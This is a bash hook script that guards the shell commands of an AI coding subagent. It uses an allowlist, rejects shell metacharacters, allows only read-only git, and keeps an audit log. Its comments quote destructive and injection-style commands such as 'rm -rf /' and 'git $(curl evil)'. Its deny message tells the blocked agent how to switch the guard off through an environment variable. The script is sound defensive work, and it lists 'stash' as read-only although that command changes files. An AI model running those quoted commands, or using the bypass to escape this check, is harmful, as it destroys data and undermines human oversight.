#!/usr/bin/env bash
# PreToolUse guard for the `codex-executor` subagent.
#
# Threat model: defends against accidental misuse AND prompt-injected misuse by
# the codex-executor subagent itself. Stops command-chaining bypasses that the
# previous first-word allowlist permitted (`git status; rm -rf /`,
# `git $(curl evil)`, `find . -exec sh -c …`, etc.).
#
# Wired into ~/.claude/settings.json as a PreToolUse hook with matcher "Bash".
# No-op for any other agent (main thread, other subagents).
#
# Allow rules (all must hold; first hit wins):
#   1. Command contains NO shell composition / substitution / redirection
#      metacharacters: ;  &  |  $  `  (  )  <  >  {  }  \  newline
#   2. First whitespace-delimited token is one of:
#      - the codex-dispatch.sh path (tilde or absolute form)
#      - one of the read-only verbs in $READONLY_VERBS
#      - `git` (further restricted to read-only subcommands)
#
# Bypass: set CLAUDE_HOOK_CODEX_GUARD=off in the environment to skip enforcement
# for the duration of that env. Each bypass is logged.
#
# Audit: every evaluated firing (allow / deny / bypass) is appended to
# ~/.claude/logs/hooks.log as a single line. No-ops for other agents are not
# logged (would dominate the file).

set -uo pipefail

HOOK_NAME="hook-codex-bash-guard"
LOG_DIR="$HOME/.claude/logs"
LOG_FILE="$LOG_DIR/hooks.log"

DISPATCH_REL="~/github/claude-config/scripts/codex-dispatch.sh"
DISPATCH_ABS="$HOME/github/claude-config/scripts/codex-dispatch.sh"

# Read-only verbs allowed for verify/inspection steps. NOT included on purpose:
#   find  — `-exec`/`-delete`/`-fprint` are RCE / destructive
#   sed   — without strict flag parsing, can edit files
#   awk   — `system()` shells out
#   bash sh env xargs — composition primitives we explicitly want to deny
READONLY_VERBS=(cat ls head tail wc grep pwd realpath dirname basename jq test sleep date echo true false)

# git subcommands considered read-only here. `branch` is allowed only when no
# destructive flag is present (handled below).
GIT_READONLY_SUBCMDS=(status log diff show rev-parse ls-files describe stash)

# ---------- helpers ----------

audit() {
  # audit <decision> <reason> <target>
  local decision="$1" reason="${2:-}" target="${3:-}"
  mkdir -p "$LOG_DIR" 2>/dev/null || return 0
  local ts
  ts=$(date -Iseconds 2>/dev/null || date +%Y-%m-%dT%H:%M:%S%z)
  printf '%s %s agent=%s tool=%s decision=%s reason=%q target=%q\n' \
    "$ts" "$HOOK_NAME" "${agent_type:-?}" "${tool_name:-?}" "$decision" "$reason" "$target" \
    >> "$LOG_FILE" 2>/dev/null || true
}

deny() {
  # deny <reason>
  local reason="$1"
  audit deny "$reason" "${command:-}"
  cat >&2 <<EOF
codex-executor: blocked by $HOOK_NAME — $reason

  attempted: ${command:-(empty)}

Allowed:
  - $DISPATCH_REL ...   (canonical dispatch path)
  - $DISPATCH_ABS ...
  - git <read-only subcommand> ...     (subcmds: ${GIT_READONLY_SUBCMDS[*]})
  - git -C <dir> <read-only subcommand> ...
  - one of: ${READONLY_VERBS[*]}

Disallowed (always):
  shell composition / substitution / redirection — ;  &  |  \$  \`  (  )  <  >  {  }  \\  newline
  destructive git — push, reset, commit, rebase, checkout, merge, branch -d/-D, etc.
  find, sed, awk, bash, sh, env, xargs

Never call \`codex exec\` directly — codex-dispatch.sh encodes sandbox / approval /
trace flags the rest of the pipeline relies on.

Bypass for one turn: set CLAUDE_HOOK_CODEX_GUARD=off (logged).
EOF
  exit 2
}

allow() {
  # allow <reason>
  audit allow "${1:-ok}" "${command:-}"
  exit 0
}

# ---------- preflight ----------

if [[ "${CLAUDE_HOOK_CODEX_GUARD:-}" == "off" ]]; then
  # Bypass requested. Still log so the user can see when the guard was disabled.
  agent_type="${agent_type:-?}"
  tool_name="${tool_name:-?}"
  command="(bypass — input not parsed)"
  audit bypass "CLAUDE_HOOK_CODEX_GUARD=off" "$command"
  exit 0
fi

if ! command -v jq >/dev/null 2>&1; then
  echo "$HOOK_NAME: jq missing on PATH — install jq or set CLAUDE_HOOK_CODEX_GUARD=off" >&2
  exit 2
fi

# ---------- parse input ----------

input="$(cat)"

agent_type="$(jq -r '.agent_type // ""' <<<"$input" 2>/dev/null)" || {
  echo "$HOOK_NAME: malformed JSON on stdin — denying" >&2
  exit 2
}
tool_name="$(jq -r '.tool_name // ""' <<<"$input" 2>/dev/null)" || {
  echo "$HOOK_NAME: malformed JSON on stdin — denying" >&2
  exit 2
}

# No-op for any caller other than the codex-executor subagent / Bash tool.
[[ "$agent_type" != "codex-executor" ]] && exit 0
[[ "$tool_name" != "Bash" ]] && exit 0

command="$(jq -r '.tool_input.command // ""' <<<"$input" 2>/dev/null)" || {
  audit deny "jq failed on tool_input.command" ""
  echo "$HOOK_NAME: malformed JSON on stdin — denying" >&2
  exit 2
}

if [[ -z "$command" ]]; then
  deny "tool_input.command empty"
fi

# ---------- metacharacter rejection ----------
#
# Reject any character that lets bash compose, substitute, or redirect — i.e.
# anything that turns one tool_input.command into N actual commands.
#
# Rejected: ;  &  |  $  `  (  )  <  >  {  }  \   plus literal newline.
# Permitted: tilde (~), globs (* ? [ ]), normal punctuation, whitespace.

if [[ "$command" == *$'\n'* ]]; then
  deny "newline in command"
fi

# Bash regex character class: characters listed are literal except ] (must be first
# after [) and ^ (treated as negation only when first). We list each metachar
# explicitly. Note backtick and dollar are literal inside [ ].
if [[ "$command" =~ [\;\&\|\$\`\(\)\<\>\{\}\\] ]]; then
  deny "shell metacharacter in command (one of ;&|\$\`()<>{}\\)"
fi

# ---------- tokenize ----------

read -r -a parts <<<"$command"
verb="${parts[0]:-}"

# ---------- allowlist: dispatch script ----------

case "$verb" in
  "$DISPATCH_REL"|"$DISPATCH_ABS")
    allow "dispatch script"
    ;;
esac

# ---------- allowlist: git read-only ----------

if [[ "$verb" == "git" ]]; then
  # Two supported forms:
  #   git <subcmd> [...]
  #   git -C <dir> <subcmd> [...]
  # Anything else (e.g. `git --git-dir=...`) is rejected to keep parsing simple
  # and avoid mis-classifying option arguments as subcommands.
  if [[ "${parts[1]:-}" == "-C" ]]; then
    if [[ -z "${parts[2]:-}" || -z "${parts[3]:-}" ]]; then
      deny "git -C requires <dir> <subcmd>"
    fi
    subcmd="${parts[3]}"
    rest_start=4
  elif [[ -n "${parts[1]:-}" && "${parts[1]}" != -* ]]; then
    subcmd="${parts[1]}"
    rest_start=2
  else
    deny "unsupported git form (only \`git <subcmd>\` and \`git -C <dir> <subcmd>\` allowed)"
  fi

  allowed=0
  for s in "${GIT_READONLY_SUBCMDS[@]}"; do
    [[ "$subcmd" == "$s" ]] && allowed=1 && break
  done

  if [[ "$subcmd" == "branch" ]]; then
    allowed=1
    for ((i=rest_start; i<${#parts[@]}; i++)); do
      case "${parts[i]}" in
        -d|-D|--delete|-m|-M|--move|-c|-C|--copy|--unset-upstream|--set-upstream-to=*|--track=*|--no-track|--edit-description|-f|--force)
          deny "git branch with destructive/mutating flag: ${parts[i]}"
          ;;
      esac
    done
  fi

  if [[ "$allowed" == "1" ]]; then
    allow "git $subcmd"
  fi
  deny "git subcommand not in read-only allowlist: $subcmd"
fi

# ---------- allowlist: read-only verbs ----------

for v in "${READONLY_VERBS[@]}"; do
  if [[ "$verb" == "$v" ]]; then
    allow "verb $v"
  fi
done

# ---------- default deny ----------

deny "verb not in allowlist: $verb"
